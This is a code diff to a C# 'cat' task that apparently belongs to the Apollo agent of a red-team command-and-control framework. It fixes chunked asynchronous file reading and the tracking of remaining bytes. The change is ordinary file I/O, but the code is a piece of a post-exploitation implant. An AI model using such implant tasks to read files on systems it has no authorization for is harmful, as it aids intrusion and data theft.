@@ -10,7 +10,7 @@ using ApolloInterop.Serializers;
 using System.Threading;
 using ApolloInterop.Classes.Collections;
 using System.IO;
-
+using TT = System.Threading.Tasks;
 namespace Tasks
 {
     public class cat : Tasking
@@ -28,7 +28,9 @@ namespace Tasks
         private ThreadSafeList<string> _contents = new ThreadSafeList<string>();
         private Action _flushContents;
         private WaitHandle[] _timers;
-        private byte[] _buffer = new byte[4096];
+        private static int _chunkSize = 4096;
+        private byte[] _buffer = new byte[_chunkSize];
+        private long _bytesRemaining = 0;
 
         public cat(IAgent agent, Task task) : base(agent, task)
         {
@@ -66,14 +68,15 @@ namespace Tasks
 
         private void FileReadCallback(IAsyncResult result)
         {
-            FileStream fs = (FileStream)result;
-            fs.EndRead(null);
+            FileStream fs = (FileStream)result.AsyncState;
+            fs.EndRead(result);
             try
             {
                 _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
-                if (fs.Length > 0)
+                _bytesRemaining = _bytesRemaining - _buffer.Length;
+                if (_bytesRemaining > 0)
                 {
-                    _buffer = fs.Length > 4096 ? new byte[4096] : new byte[fs.Length];
+                    _buffer = _bytesRemaining > _chunkSize ? new byte[_chunkSize] : new byte[_bytesRemaining];
                     fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                 } else
                 {
@@ -103,13 +106,15 @@ namespace Tasks
                     resp = CreateTaskResponse($"File {parameters.Path} does not exist.", true, "error");
                 } else
                 {
+                    TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
                     FileStream fs = null;
                     try
                     {
                         fs = File.OpenRead(parameters.Path);
-                        if (fs.Length < _buffer.Length)
+                        _bytesRemaining = fs.Length;
+                        if (_bytesRemaining < _buffer.Length)
                         {
-                            _buffer = new byte[fs.Length];
+                            _buffer = new byte[_bytesRemaining];
                         }
                         fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
                         WaitHandle.WaitAny(new WaitHandle[]
